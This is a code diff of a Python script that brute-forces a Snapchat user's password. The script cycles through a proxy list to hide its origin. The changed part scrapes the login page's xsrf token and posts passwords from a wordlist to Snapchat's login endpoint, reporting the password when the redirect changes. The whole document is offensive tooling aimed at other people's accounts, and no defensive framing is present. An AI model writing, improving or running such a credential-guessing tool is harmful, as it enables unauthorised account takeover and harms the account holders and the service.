@@ -7,7 +7,7 @@ from itertools import cycle
 import threading
 from queue import Queue
 import time
-from pysnap import Snapchat
+from lxml import html
 # pip install requests[socks]
 # brew install tor
 
@@ -41,10 +41,11 @@ number_of_threads = input("How many threads would you like to run? (Recommended 
 
 dir_path = os.path.dirname(os.path.realpath(__file__))
 #Connecting to a proxy with urllib3
-print("Connecting to Proxy")
+print("Finding Working Proxies")
 proxy_list = open(dir_path + "/proxies.txt", 'r+').readlines()
 proxy_list = [item.replace("""\n""", "") for item in proxy_list]
 proxy_pool = cycle(proxy_list)
+
 url = "https://httpbin.org/ip"
 for i in range(len(proxy_list)-1):
     #Get a proxy from the pool
@@ -52,13 +53,14 @@ for i in range(len(proxy_list)-1):
     try:
         response = requests.get(url,proxies={"http": proxy, "https": proxy})
         working_proxies.append(proxy)
-        break;
+        break
     except:
         pass;
+print("Found working proxy")
 lenght_of_proxy = len(working_proxies)
 
 number_of_proxy_rand = random.randint(0,int(lenght_of_proxy-1))
-
+print("Connecting to proxy (Might take a while)")
 number_of_proxy_rand = number_of_proxy_rand
 proxies = {
     'http':  working_proxies[number_of_proxy_rand],
@@ -74,14 +76,14 @@ os.environ['HTTPS_PROXY'] = working_proxies[number_of_proxy_rand]
 l = requests.Session()
 l.proxies = proxies
 
-s = Snapchat()
-
-print("Checking Ip")
+print("Checking Connection")
 r = l.get("https://httpbin.org/ip")
 print("your connecting through: ", r.text)
 
 
 print("ATTEMPTING BRUTEFORCE")
+
+
 login_lock = threading.Lock()
 def threader():
     while True:
@@ -92,12 +94,28 @@ def threader():
 def bruting(worker):
     time.sleep(0.5)
     with login_lock:
-        for i in range(len(password_list)) :
-            print("\n", "Username: ", snap_name, "\n","Trying Password: ", str(password_list[i-1]), "\n", str(i), "passwords tried out of", len(password_list))
-            for x in range(5):
-                print("\n")
-                s.login(snap_name, password_list[i-1])
-                print("Password found, password for", snap_name, "is:", password_list[i-1])
+        for i in range(len(password_list)):
+            login_url = "https://accounts.snapchat.com/accounts/login/"
+            result = l.get(login_url)
+
+            tree = html.fromstring(result.content)
+            authenticity_token = tree.xpath("//input[@name='xsrf_token']/@value")
+
+            payload = {
+                "username" : snap_name,
+                "password" : password_list[i-1],
+                "xsrf_token" : authenticity_token
+            }
+
+            result = l.post(
+                login_url,
+            	data = payload,
+            	headers = dict(referer=login_url)
+            )
+            if result.url == "https://accounts.snapchat.com/accounts/login" :
+                pass
+            else:
+                print("password found, password is:", password_list[i-1])
                 quit()
 
 
